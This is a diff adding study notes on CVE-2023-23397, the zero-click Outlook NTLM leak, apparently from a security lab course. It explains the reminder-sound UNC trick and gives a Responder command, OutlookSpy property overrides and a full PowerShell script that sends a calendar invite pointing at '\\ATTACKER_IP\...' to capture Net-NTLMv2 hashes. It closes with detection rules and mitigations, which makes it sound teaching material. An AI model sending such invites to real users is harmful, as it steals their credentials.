@@ -14,8 +14,8 @@
 8. ✅ [Wazuh](#wazuh)
 9. ✅ [Active Directory Basics](#active-directory-basics)
 10. [Enumerating Active Directory](#enumerating-active-directory)
-11. [Active Directory Hardening](#active-directory-hardening)
-12. [NTLM leak via Outlook](#ntlm-leak-via-outlook)
+11. ✅ [Active Directory Hardening](#active-directory-hardening)
+12. ✅ [NTLM leak via Outlook](#ntlm-leak-via-outlook)
 13. [CVE-2022-26923 AD Certificate Services](#cve-2022-26923-ad-certificate-services)
 14. [AttacktiveDirectory](#attacktivedirectory)
 
@@ -717,6 +717,93 @@ Common techniques that compromise AD security include but are not limited to:
 
 ---
 ## NTLM leak via Outlook
+![ntlm_room](./assets/images/ntlm_room.png)
+
+On 14-03-2023 Microsoft released 83 security patches on Patch Tuesday, including `CVE-2023-23397`. This CVE impact all version of the Outlook desktop app. The Outlook web app and 365 aren't vulnerable since they do not support NTLM authentication. This exploit is particularly dangerous, as it's a `zero-click exploit`, meaning no user interaction is required to trigger it. Once infected, the attacker can obtain `Net-NTLMv2` hashes.
+
+### Abusing Appointment Alerts via UNC Paths
+In Outlook, it's possible to add reminder notifications when sending calendar invtitations. It's possible to specify the audio file played for the notification. Manipulating this parameter can enable a threa actor to force Outlook to leak the current password hashes to an attacker with zero interaction required.
+
+TO do this, an attacker creates a malicious calendar invitation that includes a reference to a sound file pointing to a file in a network share in the attackers machine. Outlook stores the reference to the sound file in an internal parameter called `PidLidReminderFileParameter`. To override default configs on the victim machine, `PidLidReminderOverride` needs to be set to true.
+
+It was possible to specify a `UNC (Universal Naming Convention)` path instead of local one, which includes Network share paths like: `\\<Attacker IP>(@80/443)\foo\bar.wav`. When the victim receives the malicious email, the UNC path directs them to the SMB share, causing the system to start an NTLM authentication process against the attackers machine, leaking `Net-NTLMv2` hashes. If for some reason the SMB isnt a viable option, non-server versions of Windows will accept UNC paths to port 80 and 443 as well.
+
+![outlook](./assets/images/outlook_exploit.png)
+
+### Practical
+
+Set up Responder:
+
+```
+responder -I <intf-name> (tun0)
+```
+
+Create a new appointment in Outlook:
+
+```
+Calendar icon --> New Appointment --> Reminder (0 minutes) --> Sound... --> \\AttackIP\nonexistent\sound.wav
+```
+
+Outlook ignores the invalid input and discards it, but the OutlookSpy plugin could help to override this:
+
+```
+OutlookSpy icon --> CurrentItem --> ReminderSoundFile --> Script --> Run
+```
+
+A script can be provided to override the correct parameters and set the UNC:
+
+```
+AppointmentItem.ReminderOverrideDefault = true
+AppointmentItem.ReminderPlaySound = true
+AppointmentItem.RemidnerSoundFile = "<UNC>"
+```
+
+Responder will pick up the NTLMv2 hash after the victim machine initiates an authentication request to the nonexistent SMB share specified in the UNC path.
+
+### Weaponizingthe Vulnerability
+
+The manual settings which are done in Outlook can be 'codeified' to save some time, so an exploit created by [Oddvar Moe](https://github.com/api0cradle) can be used:
+
+```Powershell
+$Outlook = New-Object -comObject Outlook.Application
+$newcal = $outlook.CreateItem('olAppointmentItem')
+
+$newcal.Recipients.add($recipient)
+$newcal.MeetingStatus = [Microsoft.Office.Interop.Outlook.OlMeetingStatus]::olMeeting
+$newcal.Subject = $meetingsubject
+$newcal.Location = "Virtual"
+$newcal.Body = $meetingbody
+$newcal.Start = get-date
+$newcal.End = (get-date).AddHours(2)
+
+$newcal.ReminderSoundFile = $remotefilepath
+$newcal.ReminderOverrideDefault = 1
+$newcal.ReminderSet = 1
+$newcal.ReminderPlaysound = 1
+
+$newcal.send()
+```
+
+To use the exploit:
+```
+Import-Module .\<exploit_file>.ps1
+Send-CalendarNTLMLeak -recipient "test@thm.loc" -remotefilepath "\\ATTACKER_IP\foo\bar.wav" -meetingsubject "THM Meeting" -meetingbody "This is just a regular meeting invitation :)"
+```
+
+### Detection and Mitigation
+
+[sigma_rule1](./assets/outlook_rules/sigma_rule1.txt) detects Outlook initiation a connection to a WebDav or SMB share, indicating a post-exploutation phase.
+
+[sigma_rule2](./assets/outlook_rules/sigma_rule2.txt) looks to detect `svchost.exe` spawning `rundll32.exe` with command arguments like `C:\windows\system32\davclnt.dll,DavSetCookie`, which indicates a post-exploitation/exfiltration phase
+
+This [yara_rule](./assets/outlook_rules/yara_rule.yar) looks for the pattern within the files on disk. It can be used to detect suspicious MSG files on the disk.
+
+Other Mitigation techniques include:
+
+* Add users to the Protected Users Security Group, which prevents using NTLM as an authentication mechanism.
+* Block TCP 445/SMB outbound from your network to avoid any post-exploitation connection.
+* Use the PowerShell script released by Microsoft to scan against the Exchange server to detect any attack attempt.
+* Disable WebClient service to avoid webdav connection.
 
 #### [Back to top](#contents)
 
